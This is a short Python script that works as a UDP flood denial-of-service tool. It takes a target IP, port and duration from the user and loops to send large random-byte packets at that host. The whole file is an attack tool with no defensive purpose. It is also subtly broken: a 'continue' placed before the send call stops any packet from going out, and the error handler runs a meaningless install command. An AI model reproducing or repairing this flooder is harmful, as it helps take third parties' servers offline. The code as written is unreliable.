try:
  import os, sys, time, random  
  import threading, requests, socket
except Exception:
  print("Installing modules")
  os.system('requests')
#author @progman0
colors = ['\33[31m', '\33[0m', '\033[96m']

def banner():
	os.system('clear')
	with open('banner.txt', 'r') as b:
		print(colors[0] + b.read() + colors[1])

def flood(ip, port, timer):
	client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	send_bytes = random._urandom(20009)
	timeout = time.time() + timer
	while 1:
		if time.time() > timeout:
			break
		else:
			continue
		client.sendto(send_bytes, (ip, port))
		print(colors[0] + 'Sended to ' + ip + " " + str(port))		

def main():
	banner()
	ll = input(colors[2] + '(ip, port, packet) >> ' + colors[1])
	if ll:
		args = ll.split(' ')
		if len(args) > 3:
			print('error')
		else:
			flood(args[0], int(args[1]), int(args[2]))

if __name__ == "__main__":
	main()
